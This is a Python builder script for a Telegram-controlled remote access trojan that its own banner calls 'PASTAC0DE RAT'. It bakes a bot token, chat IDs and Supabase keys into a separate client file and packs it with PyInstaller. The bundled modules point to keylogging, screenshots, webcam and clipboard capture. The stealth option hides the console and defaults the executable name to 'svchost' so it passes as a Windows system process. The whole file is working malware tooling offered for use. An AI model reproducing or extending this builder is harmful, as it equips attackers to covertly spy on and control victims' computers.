#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
setup.py — Stealth EXE Builder
Console version, no GUI, minimal footprint
"""

import sys, os, subprocess, configparser, uuid, shutil, tempfile, json, time
from pathlib import Path

SCRIPT_DIR = Path(__file__).parent.resolve()
CONFIG_PATH = SCRIPT_DIR / "config.ini"
CLIENT_SOURCE = SCRIPT_DIR / "client.py"

def print_banner():
    print("""
    ╔═══════════════════════════════════════╗
    ║     PASTAC0DE RAT — ЛУЧШИЙ РАТ В ТГ)  ║
    ║         И В СВОЕМ РОДЕ)))             ║
    ╚═══════════════════════════════════════╝
    """)

def load_config():
    if CONFIG_PATH.exists():
        cfg = configparser.ConfigParser()
        cfg.read(CONFIG_PATH, encoding="utf-8")
        if cfg.has_section("Settings"):
            return {
                "bot_token": cfg.get("Settings", "bot_token", fallback=""),
                "allowed_chat_id": cfg.get("Settings", "allowed_chat_id", fallback=""),
                "log_group_id": cfg.get("Settings", "log_group_id", fallback=""),
                "supabase_url": cfg.get("Settings", "supabase_url", fallback=""),
                "supabase_key": cfg.get("Settings", "supabase_key", fallback=""),
                "access_key": cfg.get("Settings", "access_key", fallback=""),
            }
    return {}

def save_config(data):
    cfg = configparser.ConfigParser()
    cfg["Settings"] = data
    with open(CONFIG_PATH, "w", encoding="utf-8") as f:
        cfg.write(f)
    print("[+] Config saved to config.ini")

def input_config():
    print("\n[+] Enter configuration:")
    config = {}
    config["bot_token"] = input("Bot Token: ").strip()
    config["allowed_chat_id"] = input("Account ID: ").strip()
    config["log_group_id"] = input("Log Group ID (optional): ").strip()
    config["supabase_url"] = input("Supabase URL (optional): ").strip()
    config["supabase_key"] = input("Supabase Key (optional): ").strip()
    key = input("Ключ для доступа к боту (press Enter for random): ").strip()
    if not key:
        key = str(uuid.uuid4())[:16].upper()
        print("[+] Generated key: %s" % key)
    config["access_key"] = key
    return config

def check_pyinstaller():
    try:
        result = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
                               capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print("[+] PyInstaller found: %s" % result.stdout.strip())
            return True
    except:
        pass
    print("[!] PyInstaller not found!")
    print("[!] Install: python -m pip install PyInstaller")
    return False

def build_exe(config_data, output_name="svchost", stealth=True):
    if not CLIENT_SOURCE.exists():
        print("[!] client.py not found! Place it next to setup.py")
        return False

    print("\n[+] Starting build...")
    temp_dir = tempfile.mkdtemp(prefix="rat_build_")

    # Read client.py
    with open(CLIENT_SOURCE, "r", encoding="utf-8") as f:
        client_code = f.read()

    # Embed config
    config_block = (
        'EMBEDDED_CONFIG = {\n'
        '    "bot_token": "' + config_data.get("bot_token", "") + '",\n'
        '    "allowed_chat_id": "' + config_data.get("allowed_chat_id", "") + '",\n'
        '    "log_group_id": "' + config_data.get("log_group_id", "") + '",\n'
        '    "supabase_url": "' + config_data.get("supabase_url", "") + '",\n'
        '    "supabase_key": "' + config_data.get("supabase_key", "") + '",\n'
        '    "access_key": "' + config_data.get("access_key", "") + '",\n'
        '}'
    )

    old_block = (
        'EMBEDDED_CONFIG = {\n'
        '    "bot_token": "YOUR_BOT_TOKEN_HERE",\n'
        '    "allowed_chat_id": "",\n'
        '    "log_group_id": "",\n'
        '    "supabase_url": "",\n'
        '    "supabase_key": "",\n'
        '    "access_key": "",\n'
        '}'
    )

    if old_block not in client_code:
        print("[!] Could not find EMBEDDED_CONFIG placeholder!")
        return False

    client_code = client_code.replace(old_block, config_block)

    client_path = Path(temp_dir) / "client_build.py"
    with open(client_path, "w", encoding="utf-8") as f:
        f.write(client_code)

    print("[+] Config embedded")

    # Build
    build_dir = Path(temp_dir) / "build"
    dist_dir = SCRIPT_DIR / "dist"

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--clean",
        "--name", output_name,
        "--distpath", str(dist_dir),
        "--workpath", str(build_dir),
        "--specpath", str(temp_dir),
        "--hidden-import", "telebot",
        "--hidden-import", "PIL",
        "--hidden-import", "PIL.ImageGrab",
        "--hidden-import", "pyautogui",
        "--hidden-import", "psutil",
        "--hidden-import", "cv2",
        "--hidden-import", "supabase",
        "--hidden-import", "requests",
        "--hidden-import", "configparser",
        "--hidden-import", "uuid",
        "--hidden-import", "socket",
        "--hidden-import", "platform",
        "--hidden-import", "getpass",
        "--hidden-import", "tempfile",
        "--hidden-import", "zipfile",
        "--hidden-import", "shutil",
        "--hidden-import", "subprocess",
        "--hidden-import", "logging",
        "--hidden-import", "json",
        "--hidden-import", "ctypes",
        "--hidden-import", "pathlib",
        "--hidden-import", "datetime",
        "--hidden-import", "winreg",
        "--hidden-import", "win32api",
        "--hidden-import", "win32con",
        "--hidden-import", "win32gui",
        "--hidden-import", "win32process",
        "--hidden-import", "pynput.keyboard",
        "--hidden-import", "pyperclip",
        str(client_path)
    ]

    if stealth:
        cmd.insert(3, "--noconsole")
        cmd.insert(3, "--windowed")

    print("[+] Building... (this may take 2-5 minutes)")
    print("[+] Command: %s" % " ".join(cmd[:10]) + "...")

    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            cwd=str(temp_dir),
            shell=False,
            encoding="utf-8",
            errors="replace"
        )

        for line in process.stdout:
            line = line.strip()
            if line and ("Building" in line or "Completing" in line or "ERROR" in line):
                print("    > %s" % line[:80])

        process.wait(timeout=600)

        if process.returncode != 0:
            print("[!] Build failed with code %d" % process.returncode)
            return False

        exe_path = dist_dir / (output_name + ".exe")
        if exe_path.exists():
            print("\n[+] BUILD SUCCESS!")
            print("[+] EXE: %s" % exe_path)
            print("[+] Size: %d bytes" % exe_path.stat().st_size)
            return str(exe_path)
        else:
            print("[!] EXE not found after build!")
            return False

    except subprocess.TimeoutExpired:
        print("[!] Build timeout!")
        process.kill()
        return False
    except Exception as e:
        print("[!] Build error: %s" % e)
        return False
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

def main():
    print_banner()

    # Check client.py
    if not CLIENT_SOURCE.exists():
        print("[!] client.py not found in current directory!")
        print("[!] Place client.py next to setup.py")
        return

    # Load or input config
    config = load_config()
    if config.get("bot_token"):
        print("[+] Loaded config from config.ini")
        print("[+] Token: %s..." % config["bot_token"][:20])
        use_existing = input("[?] Use existing config? (y/n): ").strip().lower()
        if use_existing != "y":
            config = input_config()
            save_config(config)
    else:
        print("[!] No config found")
        config = input_config()
        save_config(config)

    # Check PyInstaller
    if not check_pyinstaller():
        return

    # Build
    name = input("[?] EXE name [svchost]: ").strip() or "svchost"
    stealth = input("[?] Stealth mode (no console)? (y/n) [y]: ").strip().lower() != "n"

    result = build_exe(config, output_name=name, stealth=stealth)

    if result:
        print("\n[+] Done! Your stealth RAT is ready.")
        print("[+] Run: %s" % result)
        print("[+] It will hide console and masquerade as system process.")
    else:
        print("\n[!] Build failed. Check errors above.")

    input("\n[+] Press Enter to exit...")

if __name__ == "__main__":
    main()